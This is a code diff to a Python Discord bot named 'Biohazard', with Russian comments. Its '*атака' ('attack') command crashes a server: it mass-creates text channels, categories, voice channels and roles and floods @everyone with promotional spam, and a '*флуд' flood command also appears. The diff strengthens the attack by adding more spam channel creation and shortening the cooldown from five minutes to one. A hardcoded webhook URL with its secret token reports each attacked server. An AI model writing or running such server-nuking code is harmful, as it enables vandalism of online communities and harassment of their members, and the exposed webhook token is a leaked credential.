@@ -134,7 +134,7 @@ class MyClient(discord.Client):
 			if message.content == '*атака': #автоматический краш
 				cooldown = 1
 				await message.delete() #удаление сообщения
-				await message.author.send('Команда будет доступна через 5 минут [для всех]')
+				await message.author.send('Команда будет доступна через 1 минуту [для всех]')
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
 				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
@@ -180,12 +180,17 @@ class MyClient(discord.Client):
 						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
 						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_category('Crash by Biohazard') #создание категории
+						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
+						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
 				except:
 					pass
 				
-				time.sleep(300)
+				time.sleep(60)
+				cooldown = 0
 				
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'
